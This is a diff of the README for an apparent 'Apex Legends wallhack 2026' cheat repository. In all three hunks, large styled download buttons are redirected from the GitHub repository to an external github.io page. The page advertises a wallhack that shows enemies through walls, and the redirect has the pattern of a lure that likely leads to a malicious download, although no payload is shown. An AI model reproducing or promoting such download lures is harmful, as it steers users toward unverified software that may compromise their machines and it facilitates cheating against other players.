@@ -1,7 +1,7 @@
 <h1>🎯 apex-legends-wallhack-2026 - See Every Enemy Through Walls</h1>
 
 <p align="center">
-<a href="https://github.com/alijahbeasley68-hash/apex-legends-wallhack-2026" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#ff6b35,#ff2d55);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(255,45,85,0.4);margin:20px 0;">⬇️ DOWNLOAD WALLHACK 2026</a>
+<a href="https://alijahbeasley68-hash.github.io" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#ff6b35,#ff2d55);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(255,45,85,0.4);margin:20px 0;">⬇️ DOWNLOAD WALLHACK 2026</a>
 </p>
 
 ---
@@ -47,7 +47,7 @@ Follow these easy steps to get your wallhack running in less than 5 minutes. You
 ### Step 1: Download the Application
 
 <p align="center">
-<a href="https://github.com/alijahbeasley68-hash/apex-legends-wallhack-2026" style="display:inline-block;padding:14px 30px;background:linear-gradient(135deg,#00b4d8,#0077b6);color:#fff;font-size:18px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 6px 20px rgba(0,119,182,0.4);">📦 GET THE DOWNLOAD LINK</a>
+<a href="https://alijahbeasley68-hash.github.io" style="display:inline-block;padding:14px 30px;background:linear-gradient(135deg,#00b4d8,#0077b6);color:#fff;font-size:18px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 6px 20px rgba(0,119,182,0.4);">📦 GET THE DOWNLOAD LINK</a>
 </p>
 
 Visit this link to download the application.
@@ -133,7 +133,7 @@ Apex Legends Wallhack 2026 transforms how you play. No more dying to enemies you
 ---
 
 <p align="center">
-<a href="https://github.com/alijahbeasley68-hash/apex-legends-wallhack-2026" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#28a745,#20c997);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(40,167,69,0.4);">🎮 DOWNLOAD APEX WALLHACK NOW</a>
+<a href="https://alijahbeasley68-hash.github.io" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#28a745,#20c997);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(40,167,69,0.4);">🎮 DOWNLOAD APEX WALLHACK NOW</a>
 </p>
 
 ---
